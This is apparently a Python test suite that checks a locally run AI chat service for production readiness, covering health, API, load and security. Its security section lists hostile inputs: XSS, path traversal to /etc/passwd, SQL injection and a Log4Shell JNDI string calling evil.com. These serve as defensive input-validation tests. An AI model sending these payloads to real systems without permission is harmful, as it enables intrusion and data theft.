#!/usr/bin/env python3
"""
Comprehensive Test Suite for Production Readiness
Tests all system components for production deployment
"""

import asyncio
import aiohttp
import json
import time
import logging
import sys
import os
from typing import Dict, Any, List, Optional
from dataclasses import dataclass
from datetime import datetime
import subprocess
import psutil

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

logger = logging.getLogger(__name__)

@dataclass
class TestResult:
    """Test result structure"""
    test_name: str
    status: str  # passed, failed, skipped
    message: str
    duration: float
    details: Dict[str, Any]

class ComprehensiveTestSuite:
    """Comprehensive test suite for production readiness"""
    
    def __init__(self):
        self.results = []
        self.base_urls = {
            'backend': 'http://localhost:8004',
            'rag_service': 'http://localhost:8005',
            'tts_service': 'http://localhost:8087',
            'frontend': 'http://localhost:3000',
            'ollama': 'http://localhost:11434'
        }
        self.session = None
    
    async def run_all_tests(self) -> Dict[str, Any]:
        """Run all tests and return comprehensive results"""
        logger.info("🚀 Starting comprehensive test suite...")
        
        async with aiohttp.ClientSession() as session:
            self.session = session
            
            # Test categories
            test_categories = [
                ('System Health', self._test_system_health),
                ('API Endpoints', self._test_api_endpoints),
                ('Security', self._test_security),
                ('Performance', self._test_performance),
                ('Data Integrity', self._test_data_integrity),
                ('Error Handling', self._test_error_handling),
                ('Load Testing', self._test_load_capacity),
                ('Integration', self._test_integration),
                ('Monitoring', self._test_monitoring),
                ('Backup & Recovery', self._test_backup_recovery)
            ]
            
            for category_name, test_func in test_categories:
                logger.info(f"📋 Running {category_name} tests...")
                try:
                    await test_func()
                except Exception as e:
                    self._add_result(f"{category_name} - Setup", "failed", f"Setup error: {e}", 0)
            
            return self._generate_report()
    
    async def _test_system_health(self):
        """Test system health and service availability"""
        
        # Test 1: Service availability
        for service, url in self.base_urls.items():
            start_time = time.time()
            try:
                async with self.session.get(f"{url}/health", timeout=5) as response:
                    duration = time.time() - start_time
                    if response.status == 200:
                        self._add_result(
                            f"Health Check - {service}",
                            "passed",
                            f"Service healthy (response time: {duration:.2f}s)",
                            duration,
                            {"response_time": duration, "status_code": response.status}
                        )
                    else:
                        self._add_result(
                            f"Health Check - {service}",
                            "failed",
                            f"Service unhealthy (status: {response.status})",
                            duration,
                            {"status_code": response.status}
                        )
            except Exception as e:
                self._add_result(
                    f"Health Check - {service}",
                    "failed",
                    f"Service unavailable: {e}",
                    time.time() - start_time,
                    {"error": str(e)}
                )
        
        # Test 2: System resources
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        self._add_result(
            "System Resources - CPU",
            "passed" if cpu_percent < 80 else "failed",
            f"CPU usage: {cpu_percent:.1f}%",
            0,
            {"cpu_percent": cpu_percent}
        )
        
        self._add_result(
            "System Resources - Memory",
            "passed" if memory.percent < 85 else "failed",
            f"Memory usage: {memory.percent:.1f}%",
            0,
            {"memory_percent": memory.percent}
        )
        
        self._add_result(
            "System Resources - Disk",
            "passed" if disk.percent < 90 else "failed",
            f"Disk usage: {disk.percent:.1f}%",
            0,
            {"disk_percent": disk.percent}
        )
    
    async def _test_api_endpoints(self):
        """Test all API endpoints"""
        
        # Test backend endpoints
        backend_tests = [
            ("/api/chat", "POST", {"message": "test", "agent": "general"}),
            ("/api/system/health", "GET", None),
            ("/api/system/metrics", "GET", None),
            ("/api/rag/enhanced/search", "POST", {"query_text": "test", "k": 5}),
            ("/api/evolutionary/stats", "GET", None),
            ("/api/voice/synthesize", "POST", {"text": "test", "voice": "natural"}),
        ]
        
        for endpoint, method, data in backend_tests:
            start_time = time.time()
            try:
                if method == "GET":
                    async with self.session.get(f"{self.base_urls['backend']}{endpoint}") as response:
                        duration = time.time() - start_time
                        status = "passed" if response.status < 400 else "failed"
                        self._add_result(
                            f"API Test - {method} {endpoint}",
                            status,
                            f"Status: {response.status}",
                            duration,
                            {"status_code": response.status, "response_time": duration}
                        )
                else:
                    async with self.session.request(
                        method, f"{self.base_urls['backend']}{endpoint}",
                        json=data, timeout=10
                    ) as response:
                        duration = time.time() - start_time
                        status = "passed" if response.status < 400 else "failed"
                        self._add_result(
                            f"API Test - {method} {endpoint}",
                            status,
                            f"Status: {response.status}",
                            duration,
                            {"status_code": response.status, "response_time": duration}
                        )
            except Exception as e:
                self._add_result(
                    f"API Test - {method} {endpoint}",
                    "failed",
                    f"Request failed: {e}",
                    time.time() - start_time,
                    {"error": str(e)}
                )
    
    async def _test_security(self):
        """Test security measures"""
        
        # Test 1: CORS configuration
        try:
            headers = {"Origin": "http://malicious-site.com"}
            async with self.session.get(
                f"{self.base_urls['backend']}/api/system/health",
                headers=headers
            ) as response:
                cors_headers = response.headers.get("Access-Control-Allow-Origin", "")
                status = "passed" if "localhost" in cors_headers else "failed"
                self._add_result(
                    "Security - CORS",
                    status,
                    f"CORS headers: {cors_headers}",
                    0,
                    {"cors_headers": dict(response.headers)}
                )
        except Exception as e:
            self._add_result("Security - CORS", "failed", f"Test failed: {e}", 0)
        
        # Test 2: Input validation
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "'; DROP TABLE users; --",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            try:
                async with self.session.post(
                    f"{self.base_urls['backend']}/api/chat",
                    json={"message": malicious_input, "agent": "general"}
                ) as response:
                    # Should not return 500 error (server error)
                    status = "passed" if response.status != 500 else "failed"
                    self._add_result(
                        f"Security - Input Validation ({malicious_input[:20]}...)",
                        status,
                        f"Status: {response.status}",
                        0,
                        {"status_code": response.status}
                    )
            except Exception as e:
                self._add_result(
                    f"Security - Input Validation ({malicious_input[:20]}...)",
                    "failed",
                    f"Request failed: {e}",
                    0
                )
    
    async def _test_performance(self):
        """Test performance benchmarks"""
        
        # Test 1: Response time benchmarks
        endpoints_to_test = [
            ("/api/system/health", "GET"),
            ("/api/chat", "POST", {"message": "performance test", "agent": "general"})
        ]
        
        for endpoint_info in endpoints_to_test:
            endpoint = endpoint_info[0]
            method = endpoint_info[1]
            data = endpoint_info[2] if len(endpoint_info) > 2 else None
            
            response_times = []
            for _ in range(10):  # Test 10 requests
                start_time = time.time()
                try:
                    if method == "GET":
                        async with self.session.get(f"{self.base_urls['backend']}{endpoint}") as response:
                            response_times.append(time.time() - start_time)
                    else:
                        async with self.session.post(
                            f"{self.base_urls['backend']}{endpoint}",
                            json=data
                        ) as response:
                            response_times.append(time.time() - start_time)
                except Exception:
                    response_times.append(10.0)  # Penalty for failed requests
            
            avg_response_time = sum(response_times) / len(response_times)
            max_response_time = max(response_times)
            
            # Performance criteria: avg < 200ms, max < 1000ms
            status = "passed" if avg_response_time < 0.2 and max_response_time < 1.0 else "failed"
            
            self._add_result(
                f"Performance - {method} {endpoint}",
                status,
                f"Avg: {avg_response_time:.3f}s, Max: {max_response_time:.3f}s",
                0,
                {"avg_response_time": avg_response_time, "max_response_time": max_response_time}
            )
    
    async def _test_data_integrity(self):
        """Test data integrity and consistency"""
        
        # Test 1: RAG data consistency
        try:
            async with self.session.post(
                f"{self.base_urls['backend']}/api/rag/enhanced/search",
                json={"query_text": "test query", "k": 5}
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    results = data.get('results', [])
                    
                    # Check if results have required fields
                    has_required_fields = all(
                        'id' in result and 'text' in result and 'score' in result
                        for result in results
                    )
                    
                    status = "passed" if has_required_fields else "failed"
                    self._add_result(
                        "Data Integrity - RAG Results",
                        status,
                        f"Results: {len(results)}, Valid format: {has_required_fields}",
                        0,
                        {"result_count": len(results), "has_required_fields": has_required_fields}
                    )
                else:
                    self._add_result(
                        "Data Integrity - RAG Results",
                        "failed",
                        f"RAG query failed: {response.status}",
                        0
                    )
        except Exception as e:
            self._add_result(
                "Data Integrity - RAG Results",
                "failed",
                f"RAG test failed: {e}",
                0
            )
    
    async def _test_error_handling(self):
        """Test error handling and recovery"""
        
        # Test 1: Invalid endpoints
        try:
            async with self.session.get(f"{self.base_urls['backend']}/api/nonexistent") as response:
                status = "passed" if response.status == 404 else "failed"
                self._add_result(
                    "Error Handling - 404 Response",
                    status,
                    f"Status: {response.status}",
                    0,
                    {"status_code": response.status}
                )
        except Exception as e:
            self._add_result(
                "Error Handling - 404 Response",
                "failed",
                f"Test failed: {e}",
                0
            )
        
        # Test 2: Invalid JSON
        try:
            async with self.session.post(
                f"{self.base_urls['backend']}/api/chat",
                data="invalid json",
                headers={"Content-Type": "application/json"}
            ) as response:
                status = "passed" if response.status == 422 else "failed"
                self._add_result(
                    "Error Handling - Invalid JSON",
                    status,
                    f"Status: {response.status}",
                    0,
                    {"status_code": response.status}
                )
        except Exception as e:
            self._add_result(
                "Error Handling - Invalid JSON",
                "failed",
                f"Test failed: {e}",
                0
            )
    
    async def _test_load_capacity(self):
        """Test system load capacity"""
        
        # Test concurrent requests
        async def make_request():
            try:
                async with self.session.post(
                    f"{self.base_urls['backend']}/api/chat",
                    json={"message": "load test", "agent": "general"},
                    timeout=5
                ) as response:
                    return response.status < 400
            except Exception:
                return False
        
        # Test with 20 concurrent requests
        start_time = time.time()
        tasks = [make_request() for _ in range(20)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        duration = time.time() - start_time
        
        successful_requests = sum(1 for r in results if r is True)
        success_rate = successful_requests / len(results) * 100
        
        status = "passed" if success_rate >= 90 else "failed"
        
        self._add_result(
            "Load Testing - Concurrent Requests",
            status,
            f"Success rate: {success_rate:.1f}% ({successful_requests}/20)",
            duration,
            {"success_rate": success_rate, "duration": duration}
        )
    
    async def _test_integration(self):
        """Test system integration"""
        
        # Test full chat flow with RAG
        try:
            async with self.session.post(
                f"{self.base_urls['backend']}/api/chat",
                json={"message": "What is artificial intelligence?", "agent": "general"}
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    
                    # Check if response has required fields
                    has_response = 'response' in data
                    has_metadata = 'performance_metrics' in data
                    
                    status = "passed" if has_response and has_metadata else "failed"
                    self._add_result(
                        "Integration - Chat Flow",
                        status,
                        f"Response received: {has_response}, Metadata: {has_metadata}",
                        0,
                        {"has_response": has_response, "has_metadata": has_metadata}
                    )
                else:
                    self._add_result(
                        "Integration - Chat Flow",
                        "failed",
                        f"Chat request failed: {response.status}",
                        0
                    )
        except Exception as e:
            self._add_result(
                "Integration - Chat Flow",
                "failed",
                f"Integration test failed: {e}",
                0
            )
    
    async def _test_monitoring(self):
        """Test monitoring and metrics"""
        
        # Test metrics endpoint
        try:
            async with self.session.get(f"{self.base_urls['backend']}/api/system/metrics") as response:
                if response.status == 200:
                    data = await response.json()
                    
                    # Check if metrics contain expected data
                    has_basic_metrics = any(key in data for key in ['uptime', 'requests', 'memory'])
                    
                    status = "passed" if has_basic_metrics else "failed"
                    self._add_result(
                        "Monitoring - Metrics Endpoint",
                        status,
                        f"Metrics available: {has_basic_metrics}",
                        0,
                        {"metrics_keys": list(data.keys())}
                    )
                else:
                    self._add_result(
                        "Monitoring - Metrics Endpoint",
                        "failed",
                        f"Metrics endpoint failed: {response.status}",
                        0
                    )
        except Exception as e:
            self._add_result(
                "Monitoring - Metrics Endpoint",
                "failed",
                f"Monitoring test failed: {e}",
                0
            )
    
    async def _test_backup_recovery(self):
        """Test backup and recovery capabilities"""
        
        # Test 1: Database connectivity (if configured)
        try:
            # This would test actual database backup/recovery in production
            # For now, we'll test the system's ability to handle data operations
            
            async with self.session.post(
                f"{self.base_urls['backend']}/api/chat",
                json={"message": "test data operation", "agent": "general"}
            ) as response:
                if response.status == 200:
                    self._add_result(
                        "Backup & Recovery - Data Operations",
                        "passed",
                        "Data operations working",
                        0,
                        {"status_code": response.status}
                    )
                else:
                    self._add_result(
                        "Backup & Recovery - Data Operations",
                        "failed",
                        f"Data operations failed: {response.status}",
                        0
                    )
        except Exception as e:
            self._add_result(
                "Backup & Recovery - Data Operations",
                "failed",
                f"Backup/recovery test failed: {e}",
                0
            )
    
    def _add_result(self, test_name: str, status: str, message: str, duration: float, details: Dict[str, Any] = None):
        """Add test result"""
        result = TestResult(
            test_name=test_name,
            status=status,
            message=message,
            duration=duration,
            details=details or {}
        )
        self.results.append(result)
        
        # Log result
        status_emoji = "✅" if status == "passed" else "❌" if status == "failed" else "⏭️"
        logger.info(f"{status_emoji} {test_name}: {message}")
    
    def _generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive test report"""
        
        total_tests = len(self.results)
        passed_tests = len([r for r in self.results if r.status == "passed"])
        failed_tests = len([r for r in self.results if r.status == "failed"])
        skipped_tests = len([r for r in self.results if r.status == "skipped"])
        
        success_rate = (passed_tests / total_tests * 100) if total_tests > 0 else 0
        
        # Categorize results
        categories = {}
        for result in self.results:
            category = result.test_name.split(" - ")[0]
            if category not in categories:
                categories[category] = {"passed": 0, "failed": 0, "skipped": 0}
            categories[category][result.status] += 1
        
        # Determine overall status
        if success_rate >= 95:
            overall_status = "EXCELLENT"
        elif success_rate >= 85:
            overall_status = "GOOD"
        elif success_rate >= 70:
            overall_status = "ACCEPTABLE"
        else:
            overall_status = "NEEDS_IMPROVEMENT"
        
        report = {
            "timestamp": datetime.utcnow().isoformat(),
            "overall_status": overall_status,
            "success_rate": success_rate,
            "summary": {
                "total_tests": total_tests,
                "passed": passed_tests,
                "failed": failed_tests,
                "skipped": skipped_tests
            },
            "categories": categories,
            "detailed_results": [
                {
                    "test_name": r.test_name,
                    "status": r.status,
                    "message": r.message,
                    "duration": r.duration,
                    "details": r.details
                }
                for r in self.results
            ],
            "recommendations": self._generate_recommendations()
        }
        
        return report
    
    def _generate_recommendations(self) -> List[str]:
        """Generate recommendations based on test results"""
        recommendations = []
        
        failed_tests = [r for r in self.results if r.status == "failed"]
        
        if any("Security" in t.test_name for t in failed_tests):
            recommendations.append("Implement additional security measures and input validation")
        
        if any("Performance" in t.test_name for t in failed_tests):
            recommendations.append("Optimize performance bottlenecks and response times")
        
        if any("Load Testing" in t.test_name for t in failed_tests):
            recommendations.append("Increase system capacity and implement load balancing")
        
        if any("Monitoring" in t.test_name for t in failed_tests):
            recommendations.append("Set up comprehensive monitoring and alerting")
        
        if any("Integration" in t.test_name for t in failed_tests):
            recommendations.append("Fix integration issues between services")
        
        if not recommendations:
            recommendations.append("System is production-ready! Consider implementing advanced monitoring and automated scaling")
        
        return recommendations

async def main():
    """Run comprehensive test suite"""
    test_suite = ComprehensiveTestSuite()
    results = await test_suite.run_all_tests()
    
    # Save results
    with open("comprehensive_test_results.json", "w") as f:
        json.dump(results, f, indent=2)
    
    # Print summary
    print("\n" + "="*60)
    print("🎯 COMPREHENSIVE TEST SUITE RESULTS")
    print("="*60)
    print(f"Overall Status: {results['overall_status']}")
    print(f"Success Rate: {results['success_rate']:.1f}%")
    print(f"Total Tests: {results['summary']['total_tests']}")
    print(f"Passed: {results['summary']['passed']}")
    print(f"Failed: {results['summary']['failed']}")
    print(f"Skipped: {results['summary']['skipped']}")
    
    print("\n📊 CATEGORY BREAKDOWN:")
    for category, stats in results['categories'].items():
        total = sum(stats.values())
        success_rate = (stats['passed'] / total * 100) if total > 0 else 0
        print(f"  {category}: {success_rate:.1f}% ({stats['passed']}/{total})")
    
    print("\n💡 RECOMMENDATIONS:")
    for i, rec in enumerate(results['recommendations'], 1):
        print(f"  {i}. {rec}")
    
    print(f"\n📄 Detailed results saved to: comprehensive_test_results.json")
    
    return results

if __name__ == "__main__":
    asyncio.run(main())
